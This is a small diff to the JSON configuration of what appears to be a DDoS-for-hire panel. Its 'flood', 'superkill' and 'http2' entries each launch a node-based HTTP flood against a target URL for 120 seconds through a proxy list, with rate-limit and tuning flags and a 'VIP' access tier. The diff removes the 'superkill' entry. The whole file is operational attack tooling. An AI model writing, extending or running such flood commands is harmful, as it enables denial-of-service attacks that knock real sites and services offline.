@@ -15,13 +15,7 @@
         "command": "node --max-old-space-size=65536 flood url 120 5 5 live.txt flood",
         "url": "url",
         "time": 120,
-        "visibility": "VIP"
-    },
-    "superkill": {
-        "command": "node --max-old-space-size=65536 superkill -m GET -u url -s 120 -p live.txt -q true -r 999 --full true --ratelimit true --delay 1 --debug false",
-        "url": "url",
-        "time": 120,
-        "visibility": "VIP"    
+        "visibility": "VIP"   
     },
     "http2": {
         "command": "node --max-old-space-size=65536 http2 url 120 5 5 live.txt --redirect true --ratelimit true --query true",
